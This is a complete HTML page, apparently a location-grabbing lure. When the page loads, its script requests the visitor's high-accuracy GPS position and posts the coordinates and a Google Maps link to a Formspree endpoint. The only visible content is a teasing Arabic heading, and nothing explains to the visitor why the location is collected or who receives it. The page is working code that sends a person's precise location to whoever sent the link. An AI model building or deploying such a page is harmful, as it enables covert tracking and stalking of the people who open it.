<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Accurate GPS Location</title>
    <script>
        // Function to send the most accurate GPS location
        function sendLocation() {
            if ("geolocation" in navigator) {
                // Request permission and use high accuracy
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude, accuracy } = position.coords; // GPS location
                        console.log(`Latitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters`);

                        const emailData = new FormData();
                        emailData.append('latitude', latitude);
                        emailData.append('longitude', longitude);
                        emailData.append('accuracy', accuracy); // Include accuracy info
                        emailData.append(
                            'message',
                            `Location:\nLatitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`
                        );

                        // Send the location via Formspree
                        fetch('https://formspree.io/f/xjkvdbwg', {
                            method: 'POST',
                            body: emailData
                        })
                        .then(response => response.json())
                        .then(() => {
                            alert('Location sent successfully!');
                            console.log('Location sent successfully!');
                        })
                        .catch((error) => {
                            console.error('Error:', error);
                            alert('Failed to send the location.');
                        });
                    },
                    (error) => {
                        alert("Error fetching location: " + error.message);
                    },
                    {
                        enableHighAccuracy: true, // Request the most accurate location
                        timeout: 10000, // Set a timeout to avoid indefinite waiting
                        maximumAge: 0 // Do not use cached locations
                    }
                );
            } else {
                alert("Geolocation is not supported by your browser.");
            }
        }

        // Trigger location sending automatically when the page loads
        window.onload = sendLocation;
    </script>
</head>
<body>
    <h1>هسيبك لخيالك</h1>

</body>
</html>
